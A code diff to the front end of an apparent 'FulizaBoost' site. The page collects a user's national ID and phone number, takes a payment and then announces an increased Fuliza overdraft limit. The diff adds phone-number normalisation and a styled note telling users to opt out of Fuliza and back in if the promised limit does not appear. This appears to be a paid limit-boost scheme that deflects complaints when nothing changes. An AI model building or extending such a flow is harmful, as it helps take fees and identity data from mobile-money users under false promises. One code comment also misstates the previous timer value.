@@ -912,6 +912,34 @@
       });
     }
 
+    // Phone number normalization function
+    function normalizePhoneInput(phone) {
+      // Remove all non-digits
+      let cleanPhone = phone.replace(/\D/g, '');
+      
+      // Remove leading 0 if present
+      if (cleanPhone.startsWith('0')) {
+        cleanPhone = cleanPhone.substring(1);
+      }
+      
+      // Remove +254 prefix if present
+      if (cleanPhone.startsWith('254')) {
+        cleanPhone = cleanPhone.substring(3);
+      }
+      
+      // Should be exactly 9 digits now
+      if (cleanPhone.length !== 9) {
+        throw new Error('Invalid phone number length');
+      }
+      
+      // Should start with 7 or 1
+      if (!/^[17]/.test(cleanPhone)) {
+        throw new Error('Phone must start with 7 or 1');
+      }
+      
+      return cleanPhone;
+    }
+
     // Show ID and phone input modal
     function showIdPhoneModal() {
       Swal.fire({
@@ -976,23 +1004,19 @@
           const phoneInput = document.getElementById('swal-phone');
           
           let idValue = idInput.value.trim();
-          let phoneValue = phoneInput.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+          let phoneValue = phoneInput.value;
           
-          // Validate ID - Not too strict, just ensure it's not empty
+          // Validate ID
           if (!idValue) {
             Swal.showValidationMessage('Please enter your ID number');
             return false;
           }
           
-          // Validate phone
-          if (!phoneValue || phoneValue.length !== 9) {
-            Swal.showValidationMessage('Phone number must be a valid 9-digit number');
-            return false;
-          }
-          
-          // Validate phone format
-          if (!/^[17]/.test(phoneValue)) {
-            Swal.showValidationMessage('Phone number must start with 7 or 1');
+          // NEW: Use the normalized phone validation
+          try {
+            phoneValue = normalizePhoneInput(phoneValue);
+          } catch (error) {
+            Swal.showValidationMessage(error.message || 'Invalid phone number format');
             return false;
           }
           
@@ -1398,7 +1422,7 @@
         const paymentSuccess = await checkPaymentStatus(paymentReference);
         
         if (paymentSuccess) {
-          // Success - MOBILE OPTIMIZED
+          // Success - MOBILE OPTIMIZED (Updated with styled note)
           await Swal.fire({
             title: 'Payment Successful!',
             html: `
@@ -1410,10 +1434,38 @@
                 <p style="color: #666; margin-top: 8px;">
                   New limit: <strong style="color: #1f7a1f;">Ksh ${selectedLoan.amount.toLocaleString()}</strong>
                 </p>
-                <p style="color: #666; margin-top: 5px; font-size: 0.85rem;">
-                  You can now use your increased limit immediately
-                </p>
-                <p style="color: #666; margin-top: 5px; font-size: 0.8rem;">
+                
+                <!-- Enhanced note with better styling -->
+                <div style="
+                  background: linear-gradient(135deg, rgba(31, 122, 31, 0.1) 0%, rgba(31, 122, 31, 0.05) 100%);
+                  border-left: 3px solid var(--accent);
+                  padding: 12px;
+                  border-radius: 8px;
+                  margin-top: 15px;
+                  text-align: left;
+                  font-size: 0.8rem;
+                  color: var(--text-dark);
+                  line-height: 1.4;
+                ">
+                  <div style="
+                    display: flex;
+                    align-items: flex-start;
+                    gap: 8px;
+                    margin-bottom: 4px;
+                  ">
+                    <i class="fas fa-exclamation-circle" style="color: var(--accent); font-size: 0.9rem;"></i>
+                    <strong style="color: var(--accent);">Important Note:</strong>
+                  </div>
+                  <div style="padding-left: 22px;">
+                    If your limit does not increase immediately, please:<br>
+                    1. Dial *234# on your phone<br>
+                    2. Select "Opt Out" from Fuliza<br>
+                    3. Wait 2 minutes, then dial *234# again<br>
+                    4. Select "Opt In" to activate your new limit
+                  </div>
+                </div>
+                
+                <p style="color: #666; margin-top: 10px; font-size: 0.8rem;">
                   Thank you for using FulizaBoost!
                 </p>
               </div>
@@ -1421,7 +1473,7 @@
             icon: false,
             confirmButtonText: 'Continue',
             confirmButtonColor: '#1f7a1f',
-            timer: 8000,
+            timer: 10000, // 10 seconds (increased from 4000ms)
             timerProgressBar: true,
             customClass: {
               popup: 'swal2-popup-mobile'
